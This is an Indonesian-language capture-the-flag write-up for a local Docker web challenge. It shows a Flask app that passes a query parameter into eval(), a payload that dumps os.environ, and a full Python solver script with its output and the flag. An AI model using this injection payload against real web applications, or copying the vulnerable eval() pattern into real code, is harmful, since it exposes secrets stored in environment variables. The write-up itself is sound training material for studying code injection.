# WriteUp: Rahasia Kuya

## Overview

* **Judul:** Rahasia Kuya
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Kuya?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex8.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Kuya]
└─$ tree
.
├── codex8.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex8.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex8:latest
    ports:
      - "1337:1337"
    environment:
      - PWN=${PWN:-testuser}
    deploy:
      resources:
        limits:
          cpus: "0.50"
          memory: 256M
        reservations:
          cpus: "0.25"
          memory: 128M
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Kuya]
└─$ PWN=WanZKey docker compose -f codex8.yml up -d --build
[+] up 14/14
 ✔ Image ghcr.io/hengkerrusia/codex8:latest Pulled                                                                 16.8s
 ✔ Network rahasiakuya_default Created                                                                              0.4s
 ✔ Container rahasiakuya-web-1 Created                                                                              1.4s

```

### 2. Reconnaissance & Bypass Restriction

Saat mencoba melakukan inspeksi container menggunakan user root, akses ditolak karena adanya pembatasan shell.

**Percobaan Gagal (Root):**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Kuya]
└─$ docker exec rahasiakuya-web-1 ls -la
Command restricted for root!

```

**Bypass User:**
Mengganti user saat eksekusi `docker exec` untuk membaca source code aplikasi (`app.py`).

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Kuya]
└─$ docker exec -u WanZKey rahasiakuya-web-1 ls -la
total 16
drwxr-xr-x    1 root     root          4096 Jan 15 05:04 .
drwxr-xr-x    1 root     root          4096 Jan 15 04:46 ..
-rw-r--r--    1 root     root          1744 Jan 15 05:03 app.py
drwxr-xr-x    2 root     root          4096 Jan 15 04:21 templates

```

### 3. Source Code Analysis (White Box)

Menganalisis file `app.py` yang didapatkan dari container.

**Snippet Vulnerable (`app.py`):**

```python
@app.route('/')
def index():
    name = request.args.get('name', '')

    # WAF: Block karakter slash '/'
    if '/' in name:
        return "<h2 style='color:red;'>Security Alert: Malicious character detected!</h2>", 403

    greeting = "Hello "
    try:
        if name:
            # VULNERABILITY: Input user masuk ke dalam fungsi eval()
            greeting = eval(f"'{greeting}' + '{name}'")
        else:
            greeting = greeting + "Guest"
    # ...

```

**Analisis Kerentanan:**

1. **Python Code Injection (Eval):** Aplikasi menggunakan fungsi `eval()` untuk menggabungkan string. Input `name` dari parameter GET dimasukkan langsung ke dalam string f-string yang dieksekusi.
2. **Filter/Constraint:** Terdapat pengecekan `if '/' in name` yang mencegah penggunaan karakter path traversal (`/`), sehingga sulit untuk membaca file sistem secara langsung (seperti `/etc/passwd`).
3. **Exploit Vector:** Karena `eval()` mengeksekusi kode Python sembarang, penyerang dapat memanipulasi struktur string untuk menyuntikkan perintah. Modul `os` sudah diimpor di header file, memungkinkan akses ke Environment Variables (`os.environ`) di mana flag sering disimpan dalam container Docker.

**Payload Construction:**
Payload yang digunakan untuk menutup string awal dan menyisipkan perintah dump environment variable:
`' + str(os.environ) + '`

### 4. Script Solver

Script Python untuk mengirimkan payload injection ke parameter `name` dan melakukan regex terhadap flag.

**File:** `exploit.py`

```python
import requests
import re

# Target URL
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload Injection:
    # Memanfaatkan celah eval() dengan menyuntikkan kode Python
    # Mengakses os.environ karena karakter '/' diblokir untuk baca file
    payload = "' + str(os.environ) + '"
    
    print("[*] Injecting Python Code via eval()...")
    
    try:
        # Kirim GET request dengan payload
        r = requests.get(URL, params={'name': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Regex untuk mencari flag format pwn{...} dalam dump env
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND IN ENV: {flag.group(0)}\n")
            else:
                print("[-] Flag not found in ENV. Dumping response:")
                print(r.text[:500] + "...") 
                
        elif r.status_code == 403:
            print("[-] WAF Triggered! Karakter '/' terdeteksi.")
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Kuya]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Injecting Python Code via eval()...
[+] Injection Successful!

[!!!] FLAG FOUND IN ENV: pwn{9dcb204b30ccf1d2c76bb6ab879ff94b}

```

## Flag

```
pwn{9dcb204b30ccf1d2c76bb6ab879ff94b}

```
